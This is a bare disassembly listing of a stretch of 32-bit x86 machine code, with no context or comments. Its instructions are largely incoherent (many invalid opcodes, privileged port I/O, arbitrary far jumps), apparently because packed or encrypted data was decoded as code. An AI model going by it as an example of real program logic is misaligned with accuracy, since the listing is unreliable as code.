  41e990:	pop    ss
  41e991:	xchg   esi,eax
  41e992:	and    bl,BYTE PTR [edi-0x39]
  41e995:	sbb    DWORD PTR [ebp+edx*1+0x380b43be],eax
  41e99c:	xor    DWORD PTR [eax-0x3f],edx
  41e99f:	and    al,ah
  41e9a1:	aas    
  41e9a2:	rol    DWORD PTR [ecx-0x6e4dc976],cl
  41e9a8:	aas    
  41e9a9:	and    al,0x95
  41e9ab:	das    
  41e9ac:	je     0x41ea23
  41e9ae:	pop    esi
  41e9af:	xchg   esp,eax
  41e9b0:	(bad)  
  41e9b1:	cmp    eax,ebp
  41e9b3:	push   ecx
  41e9b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b5:	jae    0x41ea17
  41e9b7:	add    dh,al
  41e9b9:	pushf  
  41e9ba:	dec    ebx
  41e9bb:	shl    BYTE PTR [esi+0x4d172d60],cl
  41e9c1:	out    dx,eax
  41e9c2:	icebp  
  41e9c3:	mov    eax,0xf367a62a
  41e9c8:	add    edx,DWORD PTR [ebp-0x78b3936]
  41e9ce:	push   ds
  41e9cf:	jns    0x41e952
  41e9d1:	int    0x63
  41e9d3:	aas    
  41e9d4:	sub    al,0x4b
  41e9d6:	push   ebp
  41e9d7:	push   ds
  41e9d8:	out    0x78,eax
  41e9da:	mov    dh,0xd8
  41e9dc:	dec    edx
  41e9dd:	out    0x4c,eax
  41e9df:	ror    BYTE PTR ds:0x792084a8,0x8d
  41e9e6:	es (bad) 
  41e9e8:	xor    al,BYTE PTR [ecx]
  41e9ea:	or     al,0x7a
  41e9ec:	jl     0x41ea33
  41e9ee:	out    dx,eax
  41e9ef:	sbb    DWORD PTR [eax],ebx
  41e9f1:	in     al,dx
  41e9f2:	stos   BYTE PTR es:[edi],al
  41e9f3:	jecxz  0x41ea20
  41e9f5:	push   cs
  41e9f6:	or     eax,0x9de602ac
  41e9fb:	lds    ebp,FWORD PTR [eax]
  41e9fd:	shr    BYTE PTR [esi+0x2b90b302],0xd1
  41ea04:	adc    DWORD PTR [esi-0x7f],0x34
  41ea08:	(bad)  
  41ea09:	aas    
  41ea0a:	stos   BYTE PTR es:[edi],al
  41ea0b:	pop    ecx
  41ea0c:	shr    DWORD PTR [eax-0x6f8c8023],0x7
  41ea13:	mov    al,ds:0xa0532a79
  41ea18:	cwde   
  41ea19:	cli    
  41ea1a:	iret   
  41ea1b:	and    DWORD PTR [ebx-0x33],0xfffffff7
  41ea1f:	or     bl,BYTE PTR [ebx+0x52]
  41ea22:	dec    ebx
  41ea23:	aas    
  41ea24:	(bad)  
  41ea25:	ficom  DWORD PTR [esi-0x62c1daee]
  41ea2b:	(bad)  
  41ea2c:	sbb    al,0x5
  41ea2e:	js     0x41ea2a
  41ea30:	cdq    
  41ea31:	jnp    0x41ea6f
  41ea33:	mov    bh,0xc1
  41ea35:	cwde   
  41ea36:	je     0x41ea9b
  41ea38:	lea    esi,[ebx+eiz*8+0x2ce71cff]
  41ea3f:	in     eax,0xe0
  41ea41:	xchg   BYTE PTR [ebp+0x34475d79],ah
  41ea47:	es aas 
  41ea49:	(bad)  
  41ea4b:	(bad)  
  41ea4c:	dec    edi
  41ea4d:	cld    
  41ea4e:	shr    bh,cl
  41ea50:	add    BYTE PTR [edx+0x46d0c47e],dl
  41ea56:	sub    ebp,eax
  41ea58:	stos   DWORD PTR es:[edi],eax
  41ea59:	not    BYTE PTR [edx+0x14]
  41ea5c:	push   es
  41ea5d:	js     0x41eaa4
  41ea5f:	js     0x41ea16
  41ea61:	push   cx
  41ea63:	rol    BYTE PTR [edi],0x59
  41ea66:	mov    bl,0x95
  41ea68:	add    eax,0xd123e078
  41ea6d:	add    al,0x4b
  41ea6f:	mov    BYTE PTR [esi*8+0x74ca035f],bl
  41ea76:	fs push eax
  41ea78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea79:	das    
  41ea7a:	mov    BYTE PTR [edx],0xad
  41ea7d:	mov    esi,DWORD PTR [edx+edx*8+0x6c69de6e]
  41ea84:	push   esi
  41ea85:	adc    DWORD PTR [edx-0x64],ebp
  41ea88:	int3   
  41ea89:	inc    edi
  41ea8a:	rol    esp,cl
  41ea8c:	(bad)  
  41ea8d:	std    
  41ea8e:	rcr    ch,1
  41ea90:	pop    ds
  41ea91:	mov    DWORD PTR [eax],ecx
  41ea93:	ficom  DWORD PTR [eax-0x5eefb260]
  41ea99:	retf   0x1a50
  41ea9c:	or     BYTE PTR ds:0x14105875,ah
  41eaa2:	add    DWORD PTR [ebp+0x67cbb8e1],0xffffffec
  41eaa9:	xor    ebx,DWORD PTR [eax+0x56]
  41eaac:	scas   al,BYTE PTR es:[edi]
  41eaad:	in     al,dx
  41eaae:	xchg   edx,eax
  41eaaf:	add    edx,edi
  41eab1:	jo     0x41eb20
  41eab3:	xchg   edx,eax
  41eab4:	jmp    0xbaa0e93a
  41eab9:	jecxz  0x41eacf
  41eabb:	push   0x2f
  41eabd:	fcom   DWORD PTR [edx+0x5c]
  41eac0:	xchg   ebp,eax
  41eac1:	sub    al,0xe
  41eac3:	test   al,0xa4
  41eac5:	xor    dl,BYTE PTR [ecx]
  41eac7:	call   0xc436409d
  41eacc:	aad    0xc0
  41eace:	lds    edx,FWORD PTR [ebx-0x7ae25bd0]
  41ead4:	aam    0xed
  41ead6:	(bad)  
  41ead7:	sbb    ah,ch
  41ead9:	outs   dx,DWORD PTR ds:[esi]
  41eada:	frstor [ecx+0x2478c968]
  41eae0:	scas   eax,DWORD PTR es:[edi]
  41eae1:	fisub  DWORD PTR [edi-0x5d6737b6]
  41eae7:	lds    eax,FWORD PTR [esi-0x10]
  41eaea:	iret   
  41eaeb:	or     ebx,eax
  41eaed:	nop
  41eaee:	addr16 or al,0x97
  41eaf1:	jae    0x41eb19
  41eaf3:	rcl    DWORD PTR [ebx],cl
  41eaf5:	push   ecx
  41eaf6:	pop    es
  41eaf7:	mov    dl,0x76
  41eaf9:	mov    edi,0xc5a9a9f0
  41eafe:	sbb    BYTE PTR [ebp-0x1a],0x42
  41eb02:	xchg   edx,eax
  41eb03:	enter  0x11b1,0xc1
  41eb07:	mov    DWORD PTR [ecx],eax
  41eb09:	aas    
  41eb0a:	loop   0x41eaa5
  41eb0c:	inc    edi
  41eb0d:	mov    ds:0xf5762692,eax
  41eb12:	jb     0x41eb8f
  41eb14:	sub    DWORD PTR [edi+0x1b],0x36
  41eb18:	cld    
  41eb19:	sbb    al,BYTE PTR [esi-0x6f]
  41eb1c:	xchg   esp,eax
  41eb1d:	mov    ch,al
  41eb1f:	sar    esi,1
  41eb21:	lock rcl DWORD PTR [ebp-0x27afd59b],1
  41eb28:	sub    eax,0xbc263f4a
  41eb2d:	pop    esp
  41eb2e:	dec    edi
  41eb2f:	bound  edi,QWORD PTR [edx]
  41eb31:	daa    
  41eb32:	daa    
  41eb33:	shl    BYTE PTR [esi],1
  41eb35:	mov    ds:0x8431c156,al
  41eb3a:	dec    ebx
  41eb3b:	ds loop 0x41eb1b
  41eb3e:	jecxz  0x41eb72
  41eb40:	scas   eax,DWORD PTR es:[edi]
  41eb41:	xchg   BYTE PTR [ebp+0x259eeb61],ah
  41eb47:	outs   dx,DWORD PTR ds:[esi]
  41eb48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb49:	loop   0x41ead8
  41eb4b:	xchg   ebp,ebp
  41eb4d:	lods   eax,DWORD PTR ds:[esi]
  41eb4e:	addr16 in al,0xbc
  41eb51:	sbb    eax,0x633aacef
  41eb56:	add    BYTE PTR ds:0xcc53a0ee,bl
  41eb5c:	int    0xbf
  41eb5e:	pop    edi
  41eb5f:	push   edx
  41eb60:	sbb    DWORD PTR [edi+eiz*1-0xbe301e5],esp
  41eb67:	popa   
  41eb68:	loope  0x41ebbb
  41eb6a:	lea    edi,[eax]
  41eb6c:	in     al,0x3f
  41eb6e:	lds    ebx,FWORD PTR [esi]
  41eb70:	mov    ebp,0x5f475513
  41eb75:	cmp    BYTE PTR [ebx+edx*2+0x2285fada],dh
  41eb7c:	jp     0x41eb9a
  41eb7e:	cmp    DWORD PTR [ecx+ecx*8-0x1b],esp
  41eb82:	cmp    ebx,DWORD PTR [ecx+ebx*4-0x27f926a2]
  41eb89:	inc    esp
  41eb8a:	mov    bl,0x21
  41eb8c:	mov    WORD PTR [eax+ebx*4+0x7],cs
  41eb90:	hlt    
  41eb91:	cmp    al,0xc4
  41eb93:	clts   
  41eb95:	sti    
  41eb96:	xchg   ebx,eax
  41eb97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb98:	xor    BYTE PTR [edx+eiz*4],dl
  41eb9b:	lea    ecx,[edx+0x76]
  41eb9e:	xchg   edx,eax
  41eb9f:	mov    dh,0x15
  41eba1:	test   eax,0xa05bebe5
  41eba6:	cmp    al,0x9
  41eba8:	jo     0x41eb5a
  41ebaa:	jg     0x41ec2a
  41ebac:	cld    
  41ebad:	jne    0x41ebf8
  41ebaf:	fbld   TBYTE PTR [ebp-0x66]
  41ebb2:	xchg   ecx,eax
  41ebb3:	stos   DWORD PTR es:[edi],eax
  41ebb4:	test   bl,bl
  41ebb6:	and    ebp,DWORD PTR [edx]
  41ebb8:	cmp    BYTE PTR [edi+0x67],ah
  41ebbb:	loop   0x41ebd8
  41ebbd:	mov    ch,0x32
  41ebbf:	idiv   BYTE PTR [ebp-0x1f9f2cf6]
  41ebc5:	pcmpeqd mm2,mm7
  41ebc8:	outs   dx,BYTE PTR ds:[esi]
  41ebc9:	xchg   BYTE PTR [ecx-0x514860a7],bh
  41ebcf:	in     al,dx
  41ebd0:	punpcklbw mm3,DWORD PTR [esi-0x600d395b]
  41ebd7:	retf   
  41ebd8:	push   ebp
  41ebd9:	sahf   
  41ebda:	push   cs
  41ebdb:	mov    al,ds:0x7d016d73
  41ebe0:	xchg   edx,eax
  41ebe1:	and    DWORD PTR [edi+0x43],esi
  41ebe4:	xor    dl,BYTE PTR fs:0xa3d54f8a
  41ebeb:	sub    al,0x51
  41ebed:	sbb    cl,BYTE PTR [ecx+0x3e]
  41ebf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebf1:	mov    edi,0x72f75dfc
  41ebf6:	icebp  
  41ebf7:	mov    WORD PTR [edx-0x50140078],ds
  41ebfd:	mov    ebx,DWORD PTR [edi-0x1275961]
  41ec03:	sbb    al,cl
  41ec05:	xchg   ecx,eax
  41ec06:	sbb    al,0xe1
  41ec08:	adc    BYTE PTR [edi+0x1c],ch
  41ec0b:	ja     0x41ebdc
  41ec0d:	jmp    0xa04:0x58330304
  41ec14:	adc    eax,0xa87fa91f
  41ec19:	sub    edi,DWORD PTR [edi+ebx*1-0x1ecbdb00]
  41ec20:	add    BYTE PTR [ecx+0x31],ah
  41ec23:	xchg   edx,eax
  41ec24:	inc    edx
  41ec25:	push   ebp
  41ec26:	adc    al,0x6e
  41ec28:	stos   DWORD PTR es:[edi],eax
  41ec29:	jp     0x41ecaa
  41ec2b:	ja     0x41ebaf
  41ec2d:	or     cl,BYTE PTR [ecx+edx*8+0x7b32399c]
  41ec34:	aaa    
  41ec35:	xlat   BYTE PTR cs:[ebx]
  41ec37:	jb     0x41ec54
  41ec39:	ret    0x5085
  41ec3c:	outs   dx,DWORD PTR ds:[esi]
  41ec3d:	jle    0x41ec21
  41ec3f:	xor    al,0x73
  41ec41:	inc    ecx
  41ec42:	pushf  
  41ec43:	imul   ebp,DWORD PTR [edx],0xe9b6a09b
  41ec49:	sbb    esi,DWORD PTR [esi+0x4b65099b]
  41ec4f:	(bad)
  41ec52:	retf   
  41ec53:	xchg   BYTE PTR [ecx+esi*2],dh
  41ec56:	inc    edx
  41ec57:	lock or dl,dh
  41ec5a:	xchg   edx,eax
  41ec5b:	in     eax,0xb9
  41ec5d:	jnp    0x41ecde
  41ec5f:	inc    ecx
  41ec60:	push   cs
  41ec61:	or     ebp,DWORD PTR [ebx]
  41ec63:	sub    al,BYTE PTR [ebp+0x61733b06]
  41ec69:	sbb    BYTE PTR [esi+0x25],al
  41ec6c:	sub    eax,0xbaa2ebce
  41ec71:	cmp    DWORD PTR [edi+0x34],eax
  41ec74:	or     DWORD PTR ds:[ecx+0x280ccbdf],edi
  41ec7b:	jl     0x41ecb2
  41ec7d:	xchg   esi,eax
  41ec7e:	cmp    ebp,edi
  41ec80:	fisttp WORD PTR [edx+0x55983a81]
  41ec86:	push   ebp
  41ec87:	add    ch,BYTE PTR [ebx+0x6f]
  41ec8a:	popa   
  41ec8b:	push   esp
  41ec8c:	dec    edi
  41ec8d:	je     0x41ec51
  41ec8f:	push   ebp
  41ec90:	lahf   
  41ec91:	push   esp
  41ec92:	out    dx,eax
  41ec93:	inc    edx
  41ec94:	adc    ecx,DWORD PTR [ebx+0x64746156]
  41ec9a:	int3   
  41ec9b:	pusha  
  41ec9c:	xor    dh,al
  41ec9e:	clc    
  41ec9f:	push   ds
  41eca0:	arpl   WORD PTR [edx+0x36],bx
  41eca3:	repnz inc ecx
  41eca5:	enter  0x597,0x61
  41eca9:	mov    cl,0x8d
  41ecab:	(bad)  
  41ecac:	jmp    0x41ec5f
  41ecae:	lock mov esp,0x8e82bb0
  41ecb4:	push   ecx
  41ecb5:	rcl    BYTE PTR [edx-0x6aea6330],1
  41ecbb:	adc    eax,0xd965bfe0
  41ecc0:	fimul  WORD PTR [ebx+0x38e49e5d]
  41ecc6:	repnz outs dx,DWORD PTR ds:[esi]
  41ecc8:	(bad)  
  41ecc9:	pop    esp
  41ecca:	inc    ebx
  41eccb:	jmp    0x41ed20
  41eccd:	mov    al,ds:0xe1f24f09
  41ecd2:	fild   QWORD PTR [edi]
  41ecd4:	fwait
  41ecd5:	mov    bh,ch
  41ecd7:	out    dx,eax
  41ecd8:	out    dx,eax
  41ecd9:	xlat   BYTE PTR ds:[ebx]
  41ecda:	xor    BYTE PTR [ebx-0x40e0286],bl
  41ece0:	push   eax
  41ece1:	mov    ds:0x3b392ab3,al
  41ece6:	jle    0x41ec87
  41ece8:	cs inc ecx
  41ecea:	add    BYTE PTR [ecx-0x63],ah
  41eced:	cmp    ecx,edi
  41ecef:	inc    ebx
  41ecf0:	or     al,0x7a
  41ecf2:	test   DWORD PTR [ebx+0x74],0xaafed9b5
  41ecf9:	int3   
  41ecfa:	mov    edx,0x27aedf8d
  41ecff:	mov    dl,0xa8
  41ed01:	inc    eax
  41ed02:	dec    ebp
  41ed03:	jmp    0x7d498365
  41ed08:	inc    ebx
  41ed09:	ins    DWORD PTR es:[edi],dx
  41ed0a:	retf   0x7b2
  41ed0d:	xor    DWORD PTR [ecx],esi
  41ed0f:	ss mov ah,0x6a
  41ed12:	jns    0x41eca2
  41ed14:	dec    eax
  41ed15:	jns    0x41ecc6
  41ed17:	enter  0xf6d0,0xda
  41ed1b:	mov    eax,DWORD PTR fs:[ebx]
  41ed1e:	test   al,0x40
  41ed21:	imul   edi,DWORD PTR [eax],0xe3e94135
  41ed27:	js     0x41ed04
  41ed29:	(bad)
  41ed2c:	fild   WORD PTR [ebx]
  41ed2e:	out    dx,eax
  41ed2f:	inc    esi
  41ed30:	adc    DWORD PTR [edx-0x1c21ba07],ecx
  41ed36:	inc    eax
  41ed37:	xchg   esi,eax
  41ed38:	add    al,BYTE PTR [ebp-0x77]
  41ed3b:	mov    ebp,0x8663376f
  41ed40:	lds    edx,FWORD PTR [ebx]
  41ed42:	outs   dx,BYTE PTR ds:[esi]
  41ed43:	fisttp DWORD PTR [edi+0x60]
  41ed46:	stos   BYTE PTR es:[edi],al
  41ed47:	retf   0xdede
  41ed4a:	in     al,dx
  41ed4b:	inc    ebp
  41ed4c:	mov    esi,0x4f044588
  41ed51:	fiadd  WORD PTR [ecx-0x492c9099]
  41ed57:	test   eax,0x92b48444
  41ed5c:	enter  0xe82e,0x40
  41ed60:	mov    ch,0x3
  41ed62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed63:	bound  ebx,QWORD PTR [ebx+esi*1-0x1e98c149]
  41ed6a:	mov    dh,cl
  41ed6c:	in     al,0xcb
  41ed6e:	adc    cl,BYTE PTR [eax-0xe74bf46]
  41ed74:	rcl    edi,0x4d
  41ed77:	retf   0xf1a6
  41ed7a:	in     al,0xfb
  41ed7c:	js     0x41ed99
  41ed7e:	mov    esp,0x1485b606
  41ed83:	add    BYTE PTR [esi-0x4b1158a8],ah
  41ed89:	ja     0x41edcd
  41ed8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed8c:	fdiv   DWORD PTR [eax-0x1]
  41ed8f:	inc    esp
  41ed90:	mov    ds:0x43b93a49,al
  41ed95:	call   DWORD PTR [ebx+0x30c32e27]
  41ed9b:	adc    DWORD PTR [ecx-0x18],esp
  41ed9e:	xor    DWORD PTR [esi+0x4c],ebp
  41eda1:	retf   0x697f
  41eda4:	push   ds
  41eda5:	out    dx,al
  41eda6:	xor    BYTE PTR [esi+0x409079da],ah
  41edac:	add    DWORD PTR [ebx+0x33],ebx
  41edaf:	mov    WORD PTR [ecx+0x28b1eea5],ss
  41edb5:	inc    ebx
  41edb6:	aaa    
  41edb7:	mov    al,0x37
  41edb9:	adc    eax,DWORD PTR [esi+0x11c6bc79]
  41edbf:	fld    TBYTE PTR [ebx-0xd]
  41edc2:	(bad)  
  41edc3:	ret    0x6fa6
  41edc6:	push   ebp
  41edc7:	adc    DWORD PTR [ebp-0x47],0x10
  41edcb:	mov    al,ds:0xc612536
  41edd0:	ror    BYTE PTR [edx+0x4c],0x93
  41edd4:	imul   ebp,DWORD PTR [eax-0x20a398aa],0xd
  41eddb:	push   eax
  41eddc:	aas    
  41eddd:	pop    ds
  41edde:	call   0xd3db:0xc07cb4ce
  41ede5:	add    BYTE PTR [ebp+0x791aecb8],cl
  41edeb:	cdq    
  41edec:	dec    edx
  41eded:	inc    eax
  41edee:	stc    
  41edef:	push   eax
  41edf0:	jp     0x41ee24
  41edf2:	iret   
  41edf3:	out    dx,al
  41edf4:	xor    BYTE PTR [esi-0x70f11136],dl
  41edfa:	bswap  edi
  41edfc:	push   eax
  41edfd:	and    al,0x63
  41edff:	and    esp,eax
  41ee01:	cmp    dh,bl
  41ee03:	ins    DWORD PTR es:[edi],dx
  41ee04:	lahf   
  41ee05:	test   bl,bh
  41ee07:	jno    0x41ee5a
  41ee09:	iret   
  41ee0a:	or     al,0x52
  41ee0c:	sub    eax,0x3a65f556
  41ee11:	and    eax,0xaddb7967
  41ee16:	add    DWORD PTR [ebx+eax*1],edi
  41ee19:	inc    edx
  41ee1a:	push   ss
  41ee1b:	sbb    edi,DWORD PTR [ecx+0x6dc0e7c]
  41ee21:	push   ebp
  41ee22:	(bad)  
  41ee23:	addr16 cmc 
  41ee25:	inc    eax
  41ee26:	imul   ebp,esp,0x15cc9709
  41ee2c:	lods   eax,DWORD PTR ds:[esi]
  41ee2d:	add    eax,0xbc95df06
  41ee32:	repnz inc edi
  41ee34:	adc    dh,ch
  41ee36:	data16 loope 0x41ee59
  41ee39:	sbb    eax,esp
  41ee3b:	(bad)  
  41ee3c:	adc    eax,DWORD PTR [edx]
  41ee3e:	fild   WORD PTR ds:0x7cc662e1
  41ee44:	outs   dx,DWORD PTR ds:[esi]
  41ee45:	(bad)  
  41ee46:	(bad)  
  41ee47:	ins    BYTE PTR es:[edi],dx
  41ee48:	and    DWORD PTR [ecx+eiz*8+0x37],0xffffffac
  41ee4d:	daa    
  41ee4e:	mov    edi,0x5463d0bb
  41ee53:	in     al,0x28
  41ee55:	popf   
  41ee56:	mov    ss,WORD PTR [edx]
  41ee58:	adc    BYTE PTR [eax+eiz*1-0x68],al
  41ee5c:	mov    ah,0x47
  41ee5e:	jmp    0xdff0:0x449b7d9f
  41ee65:	fadd   DWORD PTR [esp+esi*2+0x42]
  41ee69:	push   0xffffff86
  41ee6b:	sbb    eax,0xd211e94c
  41ee70:	sub    al,0xb7
  41ee72:	mov    ebx,0x4e94e521
  41ee77:	mov    edx,0xff06a2db
  41ee7c:	dec    edi
  41ee7d:	std    
  41ee7e:	jle    0x41ee1e
  41ee80:	inc    esi
  41ee81:	xchg   al,al
  41ee83:	cdq    
  41ee84:	jl     0x41eea6
  41ee86:	retf   0x6808
  41ee89:	and    BYTE PTR [esi],0x53
  41ee8c:	xchg   esp,eax
  41ee8d:	dec    edx
  41ee8e:	mov    ch,0x3a
  41ee90:	xchg   ecx,eax
  41ee91:	fdiv   DWORD PTR [edi]
  41ee93:	mov    eax,ds:0xd3cb606d
  41ee98:	fsubr  st(4),st
  41ee9a:	(bad)  
  41ee9b:	outs   dx,DWORD PTR ds:[esi]
  41ee9c:	retf   0x9e22
  41ee9f:	mov    ch,0x46
  41eea1:	leave  
  41eea2:	(bad)  ds:0x8819d317
  41eea8:	(bad)  
  41eea9:	mov    esi,0x63dc9cb8
  41eeae:	sbb    al,0x4a
  41eeb0:	data16 data16 sahf 
  41eeb3:	(bad)  
  41eeb4:	aam    0xfb
  41eeb6:	fucom  st(1)
  41eeb8:	mov    ebx,DWORD PTR [edi+0x17]
  41eebb:	out    dx,eax
  41eebc:	sar    DWORD PTR [ebp-0x66],1
  41eebf:	and    eax,0xa627d889
  41eec4:	call   0x7355:0x991e359
  41eecb:	ds and ah,cl
  41eece:	sbb    DWORD PTR [eax-0x6045e56d],0x79bc7987
  41eed8:	scas   al,BYTE PTR es:[edi]
  41eed9:	fidivr WORD PTR cs:[ecx+0x59871c07]
  41eee0:	cmp    al,0xdf
  41eee2:	or     al,0x1
  41eee4:	mov    dh,0x44
  41eee6:	std    
  41eee7:	jmp    0xae45:0xecb2d19f
  41eeee:	shl    BYTE PTR [edi-0x21],1
  41eef1:	mov    ebp,0x3a63a34
  41eef6:	inc    ecx
  41eef7:	(bad)  
  41eef8:	mov    ?,WORD PTR [edx+0x47]
  41eefb:	adc    ebp,DWORD PTR [edx+0x34dba80b]
  41ef01:	icebp  
  41ef02:	daa    
  41ef03:	stos   DWORD PTR es:[edi],eax
  41ef04:	xor    ebx,DWORD PTR [edx+0xf0f0a00]
  41ef0a:	xor    dh,BYTE PTR [edi+0x7cddea1a]
  41ef10:	mov    dh,0xd5
  41ef12:	inc    ecx
  41ef13:	ret    0xfafa
  41ef16:	jb     0x41ef52
  41ef18:	(bad)  
  41ef19:	jl     0x41ef00
  41ef1b:	or     eax,0xab102ccc
  41ef20:	dec    ebx
  41ef21:	call   0xce0a45e3
  41ef26:	jo     0x41ef75
  41ef28:	sbb    DWORD PTR [esi-0x7fd9ec34],ebx
  41ef2e:	pop    edi
  41ef2f:	lock lea ebp,[eax-0x7402c64b]
  41ef36:	hlt    
  41ef37:	ret    
  41ef38:	mov    bh,0x3e
  41ef3a:	dec    esp
  41ef3b:	sti    
  41ef3c:	jae    0x41ef90
  41ef3e:	mov    ss,WORD PTR [esi-0x7092aee0]
  41ef44:	aas    
  41ef45:	int    0xce
  41ef47:	adc    edi,DWORD PTR [eax+ebx*2-0x5294a1e6]
  41ef4e:	pushf  
  41ef4f:	dec    esp
  41ef50:	mov    ecx,0xdb3a4fd9
  41ef55:	mov    edx,ecx
  41ef57:	jecxz  0x41ef0d
  41ef59:	cli    
  41ef5a:	jmp    0xbadf36ab
  41ef5f:	icebp  
  41ef60:	fmul   DWORD PTR [ecx+0x2c]
  41ef63:	xor    bh,BYTE PTR [edi]
  41ef65:	hlt    
  41ef66:	mov    al,0x6d
  41ef68:	add    eax,0xb563559a
  41ef6d:	jno    0x41ef48
  41ef6f:	mov    al,0x95
  41ef71:	test   BYTE PTR [ebx+0x254c1e7a],dl
  41ef77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef78:	pop    ebp
  41ef79:	inc    esi
  41ef7a:	pop    ebp
  41ef7b:	jbe    0x41ef98
  41ef7d:	rcl    BYTE PTR [esi+ebp*1],cl
  41ef80:	sahf   
  41ef81:	xchg   esi,eax
  41ef82:	dec    ecx
  41ef83:	cdq    
  41ef84:	xchg   ebx,eax
  41ef85:	shl    BYTE PTR [ecx-0x7f],1
  41ef88:	mov    edi,DWORD PTR [edi+0x47]
  41ef8b:	mov    ebp,0x6f89906c
  41ef90:	jbe    0x41efea
  41ef92:	mov    al,0x30
  41ef94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef95:	xchg   BYTE PTR [edi],cl
  41ef97:	jp     0x41efca
  41ef99:	rep outs dx,BYTE PTR gs:[esi]
  41ef9c:	in     eax,0xc8
  41ef9e:	addr16 in eax,dx
  41efa0:	scas   al,BYTE PTR es:[edi]
  41efa1:	push   cs
  41efa2:	jle    0x41efee
  41efa4:	test   ah,ah
  41efa6:	stos   BYTE PTR es:[edi],al
  41efa7:	pop    ds
  41efa8:	popa   
  41efa9:	and    DWORD PTR [eax],0x14
  41efac:	inc    eax
  41efad:	imul   ebx,DWORD PTR [edi],0xffffffc4
  41efb0:	loope  0x41efb2
  41efb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efb3:	(bad)  
  41efb4:	mov    ecx,0x42fbdebb
  41efb9:	std    
  41efba:	and    al,cl
  41efbc:	in     eax,dx
  41efbd:	lds    esp,FWORD PTR [esi]
  41efbf:	test   al,0x73
  41efc1:	mov    ebp,0x50a9cd17
  41efc6:	aam    0x97
  41efc8:	(bad)  
  41efc9:	and    eax,0x34d18a2d
  41efce:	loope  0x41ef87
  41efd0:	adc    esi,DWORD PTR [ebp+ebp*4-0x2d]
  41efd4:	test   al,0x73
  41efd6:	mov    bh,0x64
  41efd8:	and    BYTE PTR [ecx],0x68
  41efdb:	imul   eax,DWORD PTR [edi+edi*1],0x38280cb9
  41efe2:	sahf   
  41efe3:	retf   0x64f3
  41efe6:	imul   esi,DWORD PTR [esi],0xffffffc2
  41efe9:	sbb    eax,0x9ba4e830
  41efee:	lahf   
  41efef:	fild   DWORD PTR [ebx]
  41eff1:	adc    ah,BYTE PTR [eax+0x5e70d6f5]
  41eff7:	std    
  41eff8:	cmp    dl,BYTE PTR [ecx+ebp*8]
  41effb:	sub    BYTE PTR [eax-0x5eeb393f],ch
  41f001:	in     eax,dx
  41f002:	or     edi,DWORD PTR [eax]
  41f004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f005:	dec    ecx
  41f006:	mov    dl,0xa5
  41f008:	pop    esp
  41f009:	icebp  
  41f00a:	xor    ebp,edi
  41f00c:	jmp    0xa1d8bef5
  41f011:	shl    BYTE PTR [esp+ebx*1-0x50da633d],cl
  41f018:	popf   
  41f019:	adc    cl,BYTE PTR [ecx+0x55]
  41f01c:	enter  0x52e6,0x60
  41f020:	pop    esi
  41f021:	mov    cs,WORD PTR [edi+0x3f]
  41f024:	int3   
  41f025:	(bad)  
  41f027:	je     0x41f02f
  41f029:	test   BYTE PTR [eax],0xd5
  41f02c:	call   0xd8d69bb3
  41f031:	stos   BYTE PTR es:[edi],al
  41f032:	dec    esp
  41f033:	std    
  41f034:	cmp    dl,BYTE PTR [eax]
  41f036:	loopne 0x41f011
  41f038:	lock lds esp,FWORD PTR [esi+0x70f75d7b]
  41f03f:	dec    edi
  41f040:	or     BYTE PTR [esi-0x58],al
  41f043:	adc    dh,0x77
  41f046:	push   edi
  41f047:	jle    0x41f02d
  41f049:	adc    edx,DWORD PTR [ecx+edi*4+0x3]
  41f04d:	cmc    
  41f04e:	dec    ebp
  41f04f:	mov    ds:0xc7c9cf28,al
  41f054:	ss daa 
  41f056:	mov    dh,0xee
  41f058:	inc    eax
  41f059:	dec    esi
  41f05a:	and    ecx,DWORD PTR [ebx-0x1c]
  41f05d:	and    ecx,DWORD PTR [esi-0x30ed60c5]
  41f063:	ins    BYTE PTR es:[edi],dx
  41f064:	mov    eax,ds:0xb92966df
  41f069:	in     eax,dx
  41f06a:	mov    edx,0x7cb1fe63
  41f06f:	outs   dx,DWORD PTR ds:[esi]
  41f070:	adc    al,0x72
  41f072:	cmp    BYTE PTR [ecx+0x4],bl
  41f075:	addr16 jbe 0x41f061
  41f078:	cld    
  41f079:	jmp    0x9544:0x7a68284b
  41f080:	sub    ah,dh
  41f082:	das    
  41f083:	pop    ss
  41f084:	jmp    FWORD PTR [eax]
  41f086:	fucom  st(0)
  41f088:	shl    BYTE PTR [edi+0x18],0x56
  41f08c:	jge    0x41f07b
  41f08e:	or     BYTE PTR [edi],0x5
  41f091:	stos   DWORD PTR es:[edi],eax
  41f092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f093:	(bad)  
  41f094:	cmp    eax,0xf59a718a
  41f099:	xchg   DWORD PTR [esi+0x3563295b],edi
  41f09f:	cmp    al,0xec
  41f0a1:	pushf  
  41f0a2:	mov    WORD PTR [esp+edx*4],ds
  41f0a5:	fistp  QWORD PTR [eax+0x51b70db9]
  41f0ab:	mov    edi,0xdc2231a3
  41f0b0:	inc    esi
  41f0b1:	(bad)  
  41f0b2:	lds    esi,FWORD PTR [edi+0x4b]
  41f0b5:	pop    edx
  41f0b6:	movntq QWORD PTR [edi-0x7a8f8025],mm1
  41f0bd:	scas   eax,DWORD PTR es:[edi]
  41f0be:	mov    DWORD PTR [edi-0x80],eax
  41f0c1:	push   cs
  41f0c2:	adc    esp,edi
  41f0c4:	fistp  DWORD PTR [eax-0x361aa7fa]
  41f0ca:	fwait
  41f0cb:	dec    edi
  41f0cc:	sbb    ch,BYTE PTR [edi]
  41f0ce:	adc    esp,DWORD PTR [ebp-0x6]
  41f0d1:	mov    DWORD PTR [ebp+ebx*2+0x27],esi
  41f0d5:	in     al,dx
  41f0d6:	stos   BYTE PTR es:[edi],al
  41f0d7:	aad    0x41
  41f0d9:	xor    cl,BYTE PTR [eax-0x26]
  41f0dc:	std    
  41f0dd:	sub    al,0x2c
  41f0df:	data16 or al,0xfb
